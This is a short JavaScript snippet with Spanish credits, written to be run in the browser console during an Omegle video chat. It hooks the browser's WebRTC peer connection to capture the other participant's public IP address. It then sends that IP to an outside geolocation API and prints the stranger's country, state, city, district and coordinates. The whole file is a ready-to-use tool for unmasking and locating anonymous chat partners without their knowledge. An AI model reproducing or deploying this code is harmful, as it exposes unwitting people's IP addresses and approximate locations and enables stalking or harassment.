/*
                           Creditos
 ################################################################
 #                     Coded By zNetShell                       #
 #              la API la saca desde ipgeolocation              #
 #           su uso es bastante simple, se mete a omegle        #
 #     abre una terminal de herramienta y ejecuta el script     #
 #                 [PROXIMAMENTE TUTORIAL EN YT]                #
 ################################################################
 
*/

let apiKey = "tu-API";

window.oRTCPeerConnection =
  window.oRTCPeerConnection || window.RTCPeerConnection;

window.RTCPeerConnection = function (...args) {
  const pc = new window.oRTCPeerConnection(...args);

  pc.oaddIceCandidate = pc.addIceCandidate;

  pc.addIceCandidate = function (iceCandidate, ...rest) {
    const fields = iceCandidate.candidate.split(" ");

    console.log(iceCandidate.candidate);
    const ip = fields[4];
    if (fields[7] === "srflx") {
      getLocation(ip);
    }
    return pc.oaddIceCandidate(iceCandidate, ...rest);
  };
  return pc;
};

let getLocation = async (ip) => {
  let url = `https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ip}`;

  await fetch(url).then((response) =>
    response.json().then((json) => {
      const output = `
          ---------------------
          IP: ${ip}
          Pais: ${json.country_name}
          Estado: ${json.state_prov}
          Ciudad: ${json.city}
          Districto: ${json.district}
          Lat / Long: (${json.latitude}, ${json.longitude})
          ---------------------
          `;
      console.log(output);
    })
  );
};
